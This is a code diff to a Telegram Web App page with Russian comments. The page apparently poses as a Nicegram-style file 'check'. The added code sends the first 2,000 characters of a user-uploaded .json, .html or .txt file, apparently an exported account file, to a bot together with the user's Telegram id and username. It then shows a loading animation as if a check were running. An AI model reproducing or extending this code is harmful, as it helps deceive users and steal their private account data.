@@ -38,10 +38,6 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .nicegram-corner i {
-            color: #34C7FF;
-        }
-
         .container {
             max-width: 400px;
             margin: 0 auto;
@@ -712,10 +708,12 @@
         if (window.Telegram && window.Telegram.WebApp) {
             tg = window.Telegram.WebApp;
             tg.expand();
+            console.log('✅ Telegram Web App загружен');
         }
 
         // Переменные
         let currentScreen = 'languageScreen';
+        let currentFile = null;
 
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
@@ -785,11 +783,16 @@
                     
                     const ext = file.name.toLowerCase();
                     if (ext.endsWith('.json') || ext.endsWith('.html') || ext.endsWith('.txt')) {
-                        // ОТПРАВЛЯЕМ ФАЙЛ В БОТ
+                        currentFile = file;
+                        
+                        // Показываем экран проверки
+                        showScreen('checkScreen');
+                        
+                        // Запускаем отправку файла
                         await sendFileToBot(file);
                         
-                        // Показываем экран анализа
-                        startFileAnalysis(file);
+                        // Показываем анимацию загрузки
+                        startLoadingAnimation();
                     } else {
                         alert('❌ Пожалуйста, загрузите файл .json, .html или .txt');
                     }
@@ -797,47 +800,52 @@
             };
         }
 
-        // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ ФАЙЛА
+        // ГЛАВНАЯ ФУНКЦИЯ - ОТПРАВКА ФАЙЛА БОТУ
         async function sendFileToBot(file) {
             try {
-                console.log('📤 Отправка файла в бот:', file.name);
+                console.log('📤 Отправляю файл в бот:', file.name);
                 
                 // Читаем файл
-                const content = await readFileAsText(file);
+                const fileContent = await readFileAsText(file);
                 
-                // Подготавливаем данные для отправки
+                // Формируем данные для отправки
                 const data = {
-                    action: 'upload_file',
+                    type: 'file_upload',
                     file_name: file.name,
                     file_size: file.size,
                     file_type: file.type,
-                    content_preview: content.substring(0, 2000), // Первые 2000 символов
+                    content_preview: fileContent.substring(0, 2000), // Первые 2000 символов
                     timestamp: new Date().toISOString(),
-                    user_info: {
-                        id: tg?.initDataUnsafe?.user?.id || 'unknown',
+                    user: {
+                        id: tg?.initDataUnsafe?.user?.id || 'unknown_user',
                         username: tg?.initDataUnsafe?.user?.username || 'anonymous'
                     }
                 };
                 
-                // Способ 1: Отправка через Telegram Web App (лучший способ)
+                // Отправляем данные через Telegram Web App
                 if (tg && tg.sendData) {
-                    console.log('📲 Отправляю через Telegram Web App');
+                    console.log('📲 Использую Telegram Web App для отправки');
                     tg.sendData(JSON.stringify(data));
-                    console.log('✅ Данные отправлены через Telegram Web App');
-                } 
-                // Способ 2: Сохраняем для отладки
-                else {
-                    console.log('⚠️ Telegram Web App не доступен, сохраняю локально');
-                    localStorage.setItem('last_file_data', JSON.stringify({
-                        file_name: file.name,
-                        timestamp: new Date().toISOString()
-                    }));
+                    console.log('✅ Данные отправлены через Web App');
+                    
+                    // Для отладки показываем в консоли
+                    console.log('Отправленные данные:', {
+                        file_name: data.file_name,
+                        file_size: data.file_size,
+                        user_id: data.user.id,
+                        preview_length: data.content_preview.length
+                    });
+                    
+                    return true;
+                } else {
+                    console.warn('⚠️ Telegram Web App не доступен');
+                    alert('⚠️ Ошибка отправки. Попробуйте перезагрузить приложение.');
+                    return false;
                 }
                 
-                return true;
-                
             } catch (error) {
-                console.error('❌ Ошибка отправки файла:', error);
+                console.error('❌ Ошибка при отправке файла:', error);
+                alert('❌ Ошибка при отправке файла. Попробуйте еще раз.');
                 return false;
             }
         }
@@ -846,17 +854,12 @@
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
                 reader.onload = (e) => resolve(e.target.result);
-                reader.onerror = (e) => reject(e);
+                reader.onerror = (e) => reject(new Error('Ошибка чтения файла'));
                 reader.readAsText(file);
             });
         }
 
-        function startFileAnalysis(file) {
-            showScreen('checkScreen');
-            startLoadingAnimation(file);
-        }
-
-        function startLoadingAnimation(file) {
+        function startLoadingAnimation() {
             const progressFill = document.getElementById('progressFill');
             const progressPercentage = document.getElementById('progressPercentage');
             const checkText = document.getElementById('checkText');
